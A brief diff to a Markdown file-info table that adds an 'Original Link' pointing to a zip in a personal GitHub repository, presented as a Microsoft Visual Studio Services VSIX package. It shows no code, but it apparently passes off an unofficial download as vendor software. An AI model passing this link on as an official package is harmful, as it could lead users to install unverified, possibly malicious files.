@@ -7,6 +7,7 @@
 | Property | Value |
 |----------|-------|
 | **Original File** | `Microsoft.VisualStudio.Services.VSIXPackage` |
+| **Original Link** | `https://github.com/Parsaprsal/UDL-3/raw/main/downloads/Microsoft.VisualStudio.Services/Microsoft.VisualStudio.Services.zip` |
 | **Size** | 2.45 MB |
 | **Status** | **Complete (100%)** |
 | **Password Protected** | **NO** |
